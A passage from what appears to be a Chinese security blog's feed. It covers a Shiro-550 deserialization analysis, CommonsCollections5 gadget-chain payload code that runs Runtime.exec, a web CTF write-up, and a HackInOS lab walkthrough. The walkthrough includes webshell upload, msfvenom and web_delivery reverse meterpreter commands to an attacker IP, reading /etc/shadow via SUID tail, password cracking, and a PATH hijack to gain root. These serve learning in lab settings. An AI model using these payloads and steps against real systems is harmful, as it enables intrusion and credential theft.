me。之后跟进程序进入<code>rememberidentity</code>，在此处下断点，并用浏览器登陆</p><p><img src="/Shiro-550/Untitled_5.png" alt="Untitled"></p><p><img src="/Shiro-550/Untitled_6.png" alt="Untitled"></p><p>根据调试器中的信息传入<code>rememberIdentity</code>，token为用户的登陆信息，info中包含用户的登陆信息与权限信息</p><p><img src="/Shiro-550/Untitled_7.png" alt="Untitled"></p><p>跟入<code>rememberIdentity</code>方法，首先调用了<code>getIdentityToRemember</code>方法，不断进行跟进，最终将info中的authcinfo中的principals的值返回给变量<code>principals</code></p><p><img src="/Shiro-550/Untitled_8.png" alt="Untitled"></p><p>继续跟进，在另一个<code>rememberIdentity</code>中调用了converPrincipalsToBytes，这个convert函数对之前的得到的principals进行了序列化，并使用了AES加密对序列化后的结果进行加密，密钥就是那一串base64解码后的值。</p><p><img src="/Shiro-550/Untitled_9.png" alt="Untitled"></p><p>跟入<code>rememberSerializedIdentity</code>，将序列化并加密后的数据进行base64编码放入cookie中通过HttpServletResponse传回给浏览器。</p><p><img src="/Shiro-550/Untitled_10.png" alt="Untitled"></p><p>至此shiro框架的登陆凭证加密过程便完成了。</p><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><p>根据接口的方法，身份认证可能与<code>getRememberedPrincipals</code>有关，看一下该方法的逻辑</p><p><img src="/Shiro-550/Untitled_11.png" alt="Untitled"></p><p>上来直接调用<code>getRememberedSerializedIdentity</code>，而该方法在类内是一个抽象方法，具体的实现是在<code>CookieRememberMeManager</code>中实现</p><p><img src="/Shiro-550/Untitled_12.png" alt="Untitled"></p><p>实现过程大致是将cookie中的认证信息进行base64解码。</p><p>回到<code>getRememberedPrincipals</code>中，在完成base64解码后调用了<code>convertBytesToPrincipals</code></p><p><img src="/Shiro-550/Untitled_13.png" alt="Untitled"></p><p>在convertBytesToPrincipals方法中，先判断是否初始化了加密服务，如果没有就直接反序列化。</p><p>跟随进入<code>deserialize</code>中，在类属性中声明了<code>DefaultSerializer</code>对象</p><p><img src="/Shiro-550/Untitled_14.png" alt="Untitled"></p><p>还原后的序列化数据被传入deserialze中。通过readObject方法反序列化为一个范型实例，在结果返回过程中回到deserialize方法时进行了强转，得到一个PrincipalCollection对象。</p><p><img src="/Shiro-550/Untitled_15.png" alt="Untitled"></p><h3 id="AES加解密过程"><a href="#AES加解密过程" class="headerlink" title="AES加解密过程"></a>AES加解密过程</h3><p>在序列化与反序列化过程中使用了AES加解密。直接通过动态调试去看AES使用了什么模式进行加解迷，根据上面的分析，断点直接打在<code>decrypt</code>方法中的cipherService判断上查看cipherService中的属性。可以看出AES加解密使用了CBC模式与PKCS5Padding的填充方式。</p><p><img src="/Shiro-550/Untitled_16.png" alt="Untitled"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>【R1】<a href="https://blog.csdn.net/Townmacro/article/details/123999816">Apache Shiro Java 反序列化漏洞分析</a></li><li>【R2】<a href="https://blog.csdn.net/god_zzZ/article/details/108391075">Shiro 550 反序列化漏洞 详细分析+poc编写</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;部署环境&quot;&gt;&lt;a href=&quot;#部署环境&quot; class=&quot;headerlink&quot; title=&quot;部署环境&quot;&gt;&lt;/a&gt;部署环境&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;操作系统 macOS&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;直接用homebrew安装tomcat，&lt;code</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections5</title>
    <link href="https://arrnitage.github.io/CommonsCollections5/"/>
    <id>https://arrnitage.github.io/CommonsCollections5/</id>
    <published>2022-04-25T02:24:20.000Z</published>
    <updated>2022-04-25T02:24:20.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CC5链源代码"><a href="#CC5链源代码" class="headerlink" title="CC5链源代码"></a>CC5链源代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建一个字符串数组存储要执行的命令</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, execArgs),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5链构成过程"><a href="#CC5链构成过程" class="headerlink" title="CC5链构成过程"></a>CC5链构成过程</h2><p>根据ysoserial在源代码中的注释，方便我们对payload的理解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">      ObjectInputStream.readObject()</span><br><span class="line">          BadAttributeValueExpException.readObject()</span><br><span class="line">              TiedMapEntry.toString()</span><br><span class="line">                  LazyMap.get()</span><br><span class="line">                      ChainedTransformer.transform()</span><br><span class="line">                          ConstantTransformer.transform()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Class.getMethod()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.getRuntime()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.exec()</span><br></pre></td></tr></table></figure><p>在程序执行<code>ObjectInputStream.readObject()</code>，进入反序列化过程。整个Gadget构建在<code>BadAttributeValue</code>下，也是通过该对象的反序列化构建出命令执行过程，跟入<code>BadAttributeValue</code>中</p><p><img src="/CommonsCollections5/BadAttributeValueExpException_readObject.png" alt="Untitled"></p><p>在72通过<code>get</code>方法获取<code>val</code>的值，该获取的值在经历一系列类型判断后调用该对象的<code>toString</code>方法。根据源代码，我们知道valObj的类型为<code>TiedMapEntry</code></p><p><img src="/CommonsCollections5/TiedMapEntry_toString.png" alt="Untitled"></p><p>在<code>toString</code>方法中，调用了<code>getKey</code>与<code>getValue</code>方法，跟进<code>getValue</code>，它调用了Map接口中的get方法。</p><p><img src="/CommonsCollections5/LazyMap_get.png" alt="Untitled"></p><p>而<code>LazyMap</code>继承<code>AbstractMapDecorator</code>实现了Map接口，并实现了get方法</p><p><img src="/CommonsCollections5/get.png" alt="Untitled"></p><p>在执行get方法过程中会执行<code>factory.transform</code>，跟进factory的定义，它通过源代码中<code>final Map lazyMap = LazyMap.decorate(innerMap, transformerChain)</code>声明，根据传入的transformerChain的类型可知其为<code>ChainedTransformer</code>。跟进<code>ChainedTransformer</code>中的<code>transform</code>方法，它遍历执行了传入的object</p><p><img src="/CommonsCollections5/ChainedTransformer_transform.png" alt="Untitled"></p><h2 id="CC中类的解释"><a href="#CC中类的解释" class="headerlink" title="CC中类的解释"></a>CC中类的解释</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer是一个接口，定义了一个transform方法</p><p><img src="/CommonsCollections5/Transformer_interface.png" alt="Untitled"></p><h3 id="functors-ChainedTransformer"><a href="#functors-ChainedTransformer" class="headerlink" title="functors.ChainedTransformer"></a>functors.ChainedTransformer</h3><p>实现Transformer链式调用，通过一个Transformer数组</p><p><strong>构造函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/CommonsCollections5/ChainedTransformer_transform.png" alt="Untitled"></p><p>在transform方法通过遍历Transformer数组每个对象，并调用每个对象的transform方法</p><h3 id="functors-InvokerTransformer"><a href="#functors-InvokerTransformer" class="headerlink" title="functors.InvokerTransformer"></a>functors.InvokerTransformer</h3><p>利用Java反射机制创建类实例，在该类中有如下几个函数</p><p><strong>构造函数InvokerTransformer</strong></p><p><img src="/CommonsCollections5/InvokerTransformer.png" alt="Untitled"></p><p><strong>核心类方法 transform</strong></p><p><img src="/CommonsCollections5/InvokerTransformer_transform.png" alt="Untitled"></p><p>通过这个类方法，我们可以直接实例化各种类，并传入任意参数，所以就可以直接构造命令执行实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><h3 id="functors-ContantTransformer"><a href="#functors-ContantTransformer" class="headerlink" title="functors.ContantTransformer"></a>functors.ContantTransformer</h3><p>每次返回相同常量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CC5链源代码&quot;&gt;&lt;a href=&quot;#CC5链源代码&quot; class=&quot;headerlink&quot; title=&quot;CC5链源代码&quot;&gt;&lt;/a&gt;CC5链源代码&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>weekly ctf-1</title>
    <link href="https://arrnitage.github.io/weekly-ctf-1/"/>
    <id>https://arrnitage.github.io/weekly-ctf-1/</id>
    <published>2020-09-08T06:14:36.000Z</published>
    <updated>2023-01-06T01:40:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>最近从B站上看到有个Weekly的CTF题，来做一做提升一下自己。这篇是第一题。整个ctf题都是在平台提供的虚拟机环境里进行。</p><p>题目地址：<a href="https://hetianlab.com/expc.do?ce=4485a3af-0030-4673-9490-3326eb5eca22">https://hetianlab.com/expc.do?ce=4485a3af-0030-4673-9490-3326eb5eca22</a></p><p>目标机：Centos7 IP地址：<strong>10.1.1.147:5001</strong></p><p>攻击机：Kali     IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为Flag{}</p><h2 id="神奇的磁带"><a href="#神奇的磁带" class="headerlink" title="神奇的磁带"></a>神奇的磁带</h2><p>在虚拟机中用浏览器直接访问<strong>10.1.1.147:5001</strong>。</p><p>先看一下网页的源码，在最底下看到有个 <code>flag.txt</code></p><p><img src="/weekly-ctf-1/image-20200908143948212.png" alt="image-20200908143948212"></p><p>访问flag.txt看看，发现是一个假的。</p><p>菜鸡如我，找不到做题的突破点了。后来发现cookie的值好像没怎么变过，尝试用base64解密一下。得到结果 <code>q1234567890p..</code></p><p><img src="/weekly-ctf-1/image-20200908144645830.png" alt="image-20200908144645830"></p><p>丢进页面里的输入框中，给了一个提示</p><p><img src="/weekly-ctf-1/image-20200908144751013.png" alt="image-20200908144751013"></p><p>题目说神奇的磁带，那答案肯定就是磁带的英文 <code>tape</code>了，在输入框中再此输入 <code>tape</code>，有获得了下一个提示</p><p><img src="/weekly-ctf-1/image-20200908144922171.png" alt="image-20200908144922171"></p><p>打开该文件看看</p><p><img src="/weekly-ctf-1/image-20200908144955704.png" alt="image-20200908144955704"></p><p>天王盖地虎，宝塔镇河妖。答案应该是 <code>btzhy</code>，再次回到最初的页面将答案输入。获得到一个php文件路径</p><p><img src="/weekly-ctf-1/image-20200908145130013.png" alt="image-20200908145130013"></p><p>打开后还是先看看源码</p><p><img src="/weekly-ctf-1/image-20200908145222406.png" alt="image-20200908145222406"></p><p>一个简单的两位数，直接进行一个破的暴，得到flag</p><p><img src="/weekly-ctf-1/image-20200908145400787.png" alt="image-20200908145400787"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近从B站上看到有个Weekly的CTF题，来做一做提升一下自己。这篇是第一题。整个ctf题都是在平台提供的虚拟机环境里进行。&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;https://hetianlab.com/expc.do?ce=4485a3af-0030-4673-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HackInOS Writeup</title>
    <link href="https://arrnitage.github.io/HackInOS-Writeup/"/>
    <id>https://arrnitage.github.io/HackInOS-Writeup/</id>
    <published>2020-08-11T11:50:23.000Z</published>
    <updated>2023-01-06T01:40:35.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><p>靶机：192.168.1.24<br>攻击机：192.168.1.14</p><h2 id="测试开始"><a href="#测试开始" class="headerlink" title="测试开始"></a>测试开始</h2><ol><li><p>先使用nmap对端口进行扫描<br><code>nmap -T4 -A -Pn -n 192.168.1.24</code><br><img src="/HackInOS-Writeup/nmap_scan.png" alt="nmap_scan"></p></li><li><p>在8000端口开启web服务，使用dirsearch进行目录扫描<br><code>dirsearch -u http://192.168.1.24:8000 -e php</code><br><img src="/HackInOS-Writeup/dirsearch_scan.png" alt="dirsearch_scan"></p></li><li><p>进入<a href="http://192.168.1.24:8000/upload.php%E6%98%AF%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%B0%9D%E8%AF%95%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E3%80%82">http://192.168.1.24:8000/upload.php是一个文件上传的页面，尝试上传木马。</a></p></li><li><p>在页面的源码中有一个注释，注释中有github链接<br><img src="/HackInOS-Writeup/github_url.png" alt="github_url"><br>是该upload.php的源码<br><img src="/HackInOS-Writeup/upload_source.png" alt="upload_source"></p></li><li><p>在上传中通过给木马文件添加<strong>GIF89</strong>和将gif后缀改为php，绕过上传限制，成功上传一句话木马</p></li><li><p>php源代码中对上传的文件名进行了修改，编写一个扫描脚本，对木马文件进行扫描</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">website, file_name</span>):</span><br><span class="line">    target_dir = <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        shell_name = hashlib.md5((file_name + <span class="built_in">str</span>(i)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        url  = website + target_dir + <span class="built_in">str</span>(shell_name) + <span class="string">&quot;.php&quot;</span></span><br><span class="line">        resp = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell_name = <span class="built_in">input</span>(<span class="string">&quot;shell name is :&quot;</span>)</span><br><span class="line">    website = <span class="built_in">input</span>(<span class="string">&quot;website is :&quot;</span>)</span><br><span class="line">    url = scan(website, shell_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] %s&quot;</span> % url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Done&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用msf生成一个php&#x2F;meterpreter&#x2F;reverse_tcp的后门文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.14 lport=4444 -f raw -o meterpreter.php</span><br></pre></td></tr></table></figure><p>将该后门通过一句话木马上传到网站的根目录下</p></li><li><p>启动msf，建立监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/mtlti/handler</span><br><span class="line">set payload php/meterpreter/handler</span><br><span class="line">set lhost 192.168.1.14</span><br><span class="line">set lport 4444</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><p>使用浏览器访问&#x2F;meterpreter.php，msf中获得到session</p></li><li><p>查看wp-config.php文件，获取数据库连接信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;db:3306&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>数据库的地址为db，通过ping获得db的ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping db</span><br><span class="line">PING db (172.18.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.3): icmp_seq=1 ttl=64 time=0.065 ms</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.3): icmp_seq=2 ttl=64 time=0.067 ms</span><br></pre></td></tr></table></figure></li><li><p>上传linuxprivchecker.py对主机的基本信息进行收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; upload linuxprivchecker.py</span><br><span class="line">&gt; shell</span><br><span class="line">&gt; python linuxprivchecker.py</span><br><span class="line">通过返回的数据分析，发现/usr/bin/tail具有SUID权限</span><br><span class="line">-rwsr-xr-x 1 root root 68584 Feb 22  2017 /usr/bin/tail</span><br></pre></td></tr></table></figure><p>通过tail查看shadow文件将结果保存在shadow.txt并下载回本地</p></li><li><p>使用john对密码进行解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john shadow.txt</span><br><span class="line">john shadow.txt --show</span><br></pre></td></tr></table></figure><p><img src="/HackInOS-Writeup/john_result.png" alt="john_result"></p></li><li><p>通过python派生出一个bash（当前使用的是&#x2F;bin&#x2F;sh）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure></li><li><p>通过新的shell切换登陆身份，进入root用户根目录下，发现flag文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="/HackInOS-Writeup/fake_flag.png" alt="fake_flag"></p></li><li><p>之前收集到一个数据库的地址和账号密码，尝试登陆数据库。先打通攻击机与172.18.0.3的连接通道。</p></li><li><p>php的session有局限型，重新创建一个root权限python的session。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload python/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.1.14</span><br><span class="line">set lport 80</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/HackInOS-Writeup/python_meterpreter.png" alt="python_meterpreter"></p></li><li><p>在已有的php的session中输入命令 <code>shell -t /bin/bash</code>，启动一个bash，在bash中用 <code>su</code>提升至root权限。并在bash中执行上图的python代码，msf接收到一个新的session</p></li><li><p>通过post&#x2F;multi&#x2F;manage&#x2F;autoroute模块自动添加路由信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set session6</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/HackInOS-Writeup/autoroute.png" alt="autoroute"></p></li><li><p>在root权限的bash中执行mysql远程登陆命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 172.18.0.3 -u wordpress -p</span><br><span class="line">wordpress</span><br><span class="line">use wordpress;</span><br><span class="line">select * from host_ssh_cred;</span><br></pre></td></tr></table></figure><p><img src="/HackInOS-Writeup/login_passwd.png" alt="login_passwd"></p></li><li><p>将pw内容进行解密，得到密码123456，尝试通过ssh远程登陆靶机的ssh</p></li><li><p>登陆后发现Desktop目录下有一个a.out可执行文件<br><img src="/HackInOS-Writeup/a_out.png" alt="a_out"></p></li><li><p>通过scp将a.out下载到本地进行分析，首先使用binwalk进行检查，发现是一个elf可执行文件</p><p><img src="/HackInOS-Writeup/binwalk.png" alt="image-20200811094656443"></p></li><li><p>将a.out文件放进ghidra中进行反编译分析，查看main函数，通过看反编译代码，发现a.out首先通过 <code>setgid(0)</code>与 <code>setuid(0)</code>将当前进程设置为root权限，然后执行系统命令 <code>whoami</code></p><p><img src="/HackInOS-Writeup/ghidra.png" alt="image-20200811095557860"></p></li><li><p>劫持whoami的执行路径，在&#x2F;tmp路径下生成一个whoami文件，其内容为&#x2F;bin&#x2F;bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/whoami</span><br><span class="line">chmod 777 /tmp/whoami</span><br></pre></td></tr></table></figure></li><li><p>将&#x2F;tmp路径添加到环境变量PATH的最前面，就可以获取root的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure></li><li><p>再次执行a.out，返回root权限的shell</p></li><li><p>进入&#x2F;root目录，看到flag</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境设置&quot;&gt;&lt;a href=&quot;#环境设置&quot; class=&quot;headerlink&quot; title=&quot;环境设置&quot;&gt;&lt;/a&gt;环境设置&lt;/h2&gt;&lt;p&gt;靶机：192.168.1.24&lt;br&gt;攻击机：192.168.1.14&lt;/p&gt;
&lt;h2 id=&quot;测试开始&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>多个sshkey管理</title>
    <link href="https://arrnitage.github.io/%E5%A4%9A%E4%B8%AAsshkey%E7%AE%A1%E7%90%86/"/>
